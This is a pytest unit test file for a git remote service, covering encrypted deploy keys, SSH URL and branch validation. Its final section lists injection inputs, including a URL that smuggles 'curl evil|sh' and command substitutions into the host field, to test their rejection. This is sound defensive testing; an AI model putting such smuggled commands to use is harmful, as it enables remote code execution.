from __future__ import annotations

import pytest

from control_plane.git_remotes_service import (
    build_remote_row,
    decrypt_private_key,
    generate_deploy_key,
    public_remote_view,
    validate_branch,
    validate_remote_url,
)

pytestmark = pytest.mark.unit

_KEY = b"0" * 32  # AES-256 key for tests


def test_build_and_decrypt_roundtrip():
    kp = generate_deploy_key()
    row = build_remote_row(
        container_id="c1", url="git@github.com:a/b.git", branch="main",
        keypair=kp, enabled=True, master_key=_KEY,
    )
    assert row["ssh_public_key"] == kp.public_key
    assert row["key_fingerprint"] == kp.fingerprint
    assert row["key_type"] == "ed25519"
    assert decrypt_private_key(row, _KEY) == kp.private_key


def test_public_view_never_leaks_private_key():
    kp = generate_deploy_key()
    row = build_remote_row(
        container_id="c1", url="git@github.com:a/b.git", branch="main",
        keypair=kp, enabled=True, master_key=_KEY,
    )
    view = public_remote_view(row)
    blob = repr(view)
    assert "PRIVATE KEY" not in blob
    assert "ssh_private_key_ciphertext" not in view
    assert view["ssh_public_key"] == kp.public_key
    assert view["url"] == "git@github.com:a/b.git"
    assert view["needs_relink"] is False


def test_public_view_needs_relink_when_no_key():
    view = public_remote_view({
        "url": "git@github.com:a/b.git", "branch": "main", "enabled": True,
        "ssh_public_key": None, "key_fingerprint": None, "key_type": None,
    })
    assert view["needs_relink"] is True


# ---------------------------------------------------------------------------
# SSH URL validation (new behaviour — L2 of link-remote-ssh feature)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "git@github.com:acme/site.git",
    "git@github.com:acme/site",
    "ssh://git@github.com/acme/site.git",
    "ssh://git@gitlab.com:2222/group/repo.git",
])
def test_validate_remote_url_accepts_ssh(url: str) -> None:
    assert validate_remote_url(url) == url.strip()


@pytest.mark.parametrize("url,msg", [
    ("https://github.com/acme/site.git", "ssh"),
    ("http://github.com/acme/site.git", "ssh"),
    ("ssh://git:secret@github.com/acme/site.git", "password"),
    ("git@github.com:", "path"),
    ("not a url", "ssh"),
    ("", "ssh"),
])
def test_validate_remote_url_rejects_ssh(url: str, msg: str) -> None:
    with pytest.raises(ValueError) as ei:
        validate_remote_url(url)
    assert msg in str(ei.value).lower()


def test_remote_host_extracts_hostname() -> None:
    from control_plane.git_remotes_service import remote_host
    assert remote_host("git@github.com:a/b.git") == "github.com"
    assert remote_host("ssh://git@gitlab.com:2222/g/r.git") == "gitlab.com"


# ---------------------------------------------------------------------------
# Branch name validation (L3 of link-remote-ssh feature)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("b", ["main", "develop", "feature/x", "release-1.2"])
def test_validate_branch_accepts(b):
    assert validate_branch(b) == b


@pytest.mark.parametrize("b", [
    "", " ", "a b", "a..b", "/lead", "trail/", "has~tilde", "caret^",
    "q?", "star*", "br[ack", "a@{0}", "@", "back\\slash", "ctrl\x01",
])
def test_validate_branch_rejects(b):
    with pytest.raises(ValueError):
        validate_branch(b)


# ---------------------------------------------------------------------------
# validate_remote_url — reject non-SSH schemes (L2 follow-up fix)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "git://github.com/a/b.git",
    "ftp://host/path",
    "svn+ssh://host/repo",
])
def test_validate_remote_url_rejects_non_ssh_schemes(url):
    with pytest.raises(ValueError) as ei:
        validate_remote_url(url)
    assert "ssh" in str(ei.value).lower()


# ---------------------------------------------------------------------------
# Ed25519 deploy-key generation (L4 of link-remote-ssh feature)
# ---------------------------------------------------------------------------


def test_generate_deploy_key_shape():
    kp = generate_deploy_key()
    assert kp.public_key.startswith("ssh-ed25519 ")
    assert "PRIVATE KEY" in kp.private_key  # OpenSSH PEM
    assert kp.key_type == "ed25519"
    assert kp.fingerprint.startswith("SHA256:")


def test_generate_deploy_key_unique():
    assert generate_deploy_key().public_key != generate_deploy_key().public_key


# ---------------------------------------------------------------------------
# Part C (L8 security follow-up): reject shell metacharacters in host
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "git@a;curl evil|sh:repo/x",
    "git@host`whoami`:r/x",
    "git@h$(id):r/x",
    "git@h name:r/x",
])
def test_validate_remote_url_rejects_shell_metachars_in_host(url):
    with pytest.raises(ValueError):
        validate_remote_url(url)
